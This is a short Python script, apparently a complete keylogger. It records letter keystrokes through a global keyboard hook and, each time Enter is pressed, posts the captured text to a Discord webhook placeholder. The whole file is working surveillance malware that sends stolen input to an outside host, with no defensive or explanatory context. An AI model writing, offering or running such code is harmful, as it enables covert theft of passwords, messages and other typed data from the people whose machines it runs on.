import keyboard
import requests

webhook_url = 'DISCORD_WEBHOOK'

def send_to_discord(message):
    data = {'content': message}
    requests.post(webhook_url, json=data)

buffer = []

def on_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:
        if event.name == 'enter':
            if buffer:
                send_to_discord(''.join(buffer))
                buffer.clear()
        elif event.name.isalpha():
            buffer.append(event.name)

if __name__ == '__main__':
    try:
        keyboard.on_press(on_key_event)
        keyboard.wait('esc')
    except ImportError as e:
        print(f'Error: {e}. Please run this script as root.')